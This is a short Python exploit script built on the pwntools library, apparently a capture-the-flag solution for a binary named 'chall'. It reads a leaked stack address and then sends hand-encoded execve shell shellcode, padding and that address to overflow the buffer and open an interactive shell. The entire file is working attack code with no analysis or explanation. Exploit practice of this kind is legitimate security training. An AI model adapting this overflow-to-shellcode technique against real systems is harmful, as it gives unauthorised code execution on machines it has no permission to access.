#!/usr/bin/env python3
from pwn import *

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
#HOST = ''
#PORT = 

binf = ELF(bin_file)

def attack(io, **kwargs):
    shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    io.sendlineafter('>', '1')
    io.recvuntil('[0x')
    leak = int(io.recv(12), 16)
    print(hex(leak))
    io.sendlineafter('>', shellcode + b'a'*(0x48-len(shellcode)) + p64(leak))

def main():
    io = process(bin_file)
    #io = remote(HOST, PORT)
    attack(io)
    #gdb.attach(io, '')
    io.interactive()

if __name__ == '__main__':
    main()
